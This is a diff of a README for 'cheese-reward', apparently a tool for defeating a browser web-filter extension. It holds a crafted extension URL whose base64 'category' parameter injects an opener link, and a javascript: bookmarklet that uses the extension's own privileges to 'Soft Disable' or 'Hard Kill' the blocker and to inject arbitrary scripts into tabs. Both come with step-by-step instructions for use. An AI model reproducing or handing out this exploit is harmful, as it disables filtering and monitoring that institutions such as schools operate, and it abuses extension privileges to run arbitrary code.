@@ -1,12 +1,18 @@
 # cheese-reward
 **this is a thingy for securely i will try to keep it updated**
 
+
+
 chrome-extension://iheobagjkfklnlikgihanlhcddjoihkg/blocked.html?category=PGEgaHJlZj0iYWJvdXQ6YmxhbmsiIHRhcmdldD0iX2JsYW5rIiByZWw9Im9wZW5lciIgc3R5bGU9IiBiYWNrZ3JvdW5kOiB3aGl0ZTsgY2
 9sb3I6IGJsYWNrOyBkaXNwbGF5OiBibG9jazsgaGVpZ2h0OiAzODBweDsgdHJhbnNmb3JtOiBzY2FsZSgyLjUpOyBkaXNwbGF5OiBmbGV4OyBqdXN0aWZ5LWNvbnRlbnQ6IGNlbnRlcjsgYWxpZ24taXRlbXM6IG
 NlbnRlcjsgIj48ZGl2PkNsaWNrIE1lPC9kaXY%2BIDwvYT4%3D
 
+
+
 **Just copy that and put into the first bookmark with ctrl + d, more, and putting the code into the
 url**
+
+
 
 javascript: (document = window.document), document.write( "<html> <body> <center><head> <h1>[Point Blank Swap Launcher]</h1><center><h1>---Disabling---</h1></center>\n<center><button
 id='soft'>Soft Disable</button></center><center><button id='hard'>Hard Kill</button></center><center><button id='reload'>Reload Blocker</button></center><center><center><h1> ---Scripts---
@@ -43,6 +49,7 @@ document.getElementById("soft").innerHTML = "Disabled"; opener.chrome.extension.
 opener.chrome.browserAction.onClicked.addListener(() => { opener.chrome.tabs.query( { active: true, currentWindow: true }, (tab) => { opener.chrome.tabs.executeScript(tab[0].id, {
 code: %60 %60 + document.getElementById("code").value, matchAboutBlank: true, }); } ); }); alert("Everytime you click your extension, your code will show"); }, !1 );
 
+ 
   
 **Repeat the same process for this one.
 After you have both, click the first one, press click me, and then click the second. At this page,
